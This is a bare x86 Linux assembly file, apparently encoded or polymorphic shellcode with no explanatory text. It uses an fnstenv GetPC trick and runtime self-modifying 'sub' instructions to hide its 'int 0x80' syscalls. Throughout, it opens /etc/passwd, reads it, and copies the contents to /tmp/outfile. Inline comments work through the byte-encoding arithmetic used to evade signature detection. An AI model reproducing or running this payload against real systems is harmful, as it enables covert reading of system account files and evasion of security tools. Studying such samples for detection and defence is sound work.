global _start
section .text
_start:
	fcmovbe st1
	cld				; 1 byte
	fnstenv [esp-0xc] 
	pop edi
	xor eax, eax
	mov esi, eax
	mov ebx, dword 0x0305122e
	sub DWORD [edi+0x30],ebx	; 3 bytes
	sub WORD [edi+0x4a],bx		; 4 bytes
	sub DWORD [edi+0x4c],ebx	; 3 bytes
	sub WORD [edi+0x59],bx		; 4 bytes
	sub DWORD [edi+0x5b],ebx	; 3 bytes
	add edi, 0x5b			; 3 bytes 83 c7 5e
	sub WORD [edi+0x7b-0x5b],bx		; 4 bytes
	sub DWORD [edi+0x7d-0x5b],ebx	; 3 bytes
	sub WORD [edi+0x86-0x5b],bx	; 4 bytes

	;xor eax,eax		;31 c0
	;mov al,0x5		;b0 05
	;2e120503 (0x0305122e le) + 31 c0 b0 05 = 5f d2 b5 08
	;00000000  5F                pop edi
	;00000001  D2                db 0xd2
	;00000002  B508              mov ch,0x8
	pop edi
	db 0xd2
	mov ch, 0x8
	xor ecx,ecx
	push ecx
	push 0x64777373 
	push 0x61702f63
	push 0x74652f2f
	lea ebx,[esp +1]
	; int 0x80		;cd 80
        ;2e12 (0x122e le) + 0xcd80 = fb 92
        ;00000000  FB                sti
        ;00000001  92                xchg eax,edx
        sti
        xchg eax, edx


	; mov ebx,eax		;89 c3
	; mov al,0x3		;b0 03
	;2e120503 (0x0305122e le) + 89 c3 b0 03 = b7 d5 b5 06
	;00000000  B7D5              mov bh,0xd5
	;00000002  B506              mov ch,0x6
	mov bh, 0xd5
	mov ch, 0x6
	mov edi,esp
	mov ecx,edi
	push esi
	; push WORD 0xffff 	; 66 6a ff
	db 0x66
	db 0x6a
	db 0xff
	pop edx
	; int 0x80		;cd 80
        ;2e12 (0x122e le) + 0xcd80 = fb 92
        ;00000000  FB                sti
        ;00000001  92                xchg eax,edx
        sti
        xchg eax, edx
	

	; mov esi,eax		;89 c6
	; push 0x5		;6a 05
	;2e120503 (0x0305122e le) + 89 c6 6a 05 = b7 d8 6f 08
	;00000000  B7D8              mov bh,0xd8
	;00000002  6F                outsd
	;00000003  08                db 0x08
	mov bh, 0xd8
	outsd
	db 0x08
	pop eax
	xor ecx,ecx
	push ecx
	push 0x656c6966
	push 0x74756f2f
	push 0x706d742f
	mov ebx,esp
	mov cl,0102o
	push WORD 0644o
	pop edx
	; int 0x80
        ;2e12 (0x122e le) + 0xcd80 = fb 92
        ;00000000  FB                sti
        ;00000001  92                xchg eax,edx
        sti
        xchg eax, edx

	; mov ebx,eax		;89 c3
	; push 0x4		;6a 04
	;2e120503 (0x0305122e le) + 89 c3 6a 04 = b7 d5 6f 07
	;00000000  B7D5              mov bh,0xd5
	;00000002  6F                outsd
	;00000003  07                pop es
	mov bh, 0xd5
	outsd
	pop es
	pop eax
	mov ecx,edi
	mov edx,esi
	; int 0x80
        ;2e12 (0x122e le) + 0xcd80 = fb 92
        ;00000000  FB                sti
        ;00000001  92                xchg eax,edx
        sti
        xchg eax, edx

	xor eax,eax
	xor ebx,ebx
	mov al,0x1		;b0 01
	mov bl,0x5		;b3 05
	int 0x80		;cd 80

